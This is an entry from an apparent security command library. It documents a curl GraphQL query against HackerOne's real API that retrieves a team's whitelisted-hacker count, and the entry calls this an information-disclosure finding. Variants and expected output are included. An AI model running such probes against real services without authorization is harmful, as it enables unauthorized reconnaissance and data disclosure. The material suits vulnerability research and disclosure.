---
id: cmd-graphql-security
data: >-
  curl -X POST https://api.hackerone.com/graphql -H "Content-Type:
  application/json" -d '{"query": "query
  {team(handle:\"security\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
tags:
  - graphql
  - recon
type: command
output: >-
  {"data":{"team":{"id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","name":"HackerOne","handle":"security",
  "whitelisted_hackers":{"total_count":30}}}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.120Z'
verified: false
validated: true
submitted: true
---
# graphql-query-security-team

## Command

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"security\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
```

## Description

This command sends a GraphQL query to HackerOne's API to fetch details of the 'security' team, including the unauthorized total_count of whitelisted hackers, demonstrating information disclosure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-H "Content-Type: application/json"` | Sets JSON header for GraphQL payload | Yes |
| `-d '{...}'` | JSON data with GraphQL query; handle: \"security\" | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"security\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
```

### Advanced Usage

Add verbose output with `-v` for debugging:

```bash
curl -v -X POST https://api.hackerone.com/graphql -H "Content-Type: application/json" -d '{"query": "query {team(handle:\"security\"){id,name,handle,whitelisted_hackers{total_count}}}"}'
```

## Expected Output

JSON response with team data and total_count:30, e.g., {"data":{"team":{"id":"Z2lkOi8vaGFja2Vyb25lL1RlYW0vMTM=","name":"HackerOne","handle":"security","whitelisted_hackers":{"total_count":30}}}}.

## Related

- [[commands/graphql-query-nonpublic-program]]
- [[procedures/Query-Security-Team-Whitelisted-Hackers]]
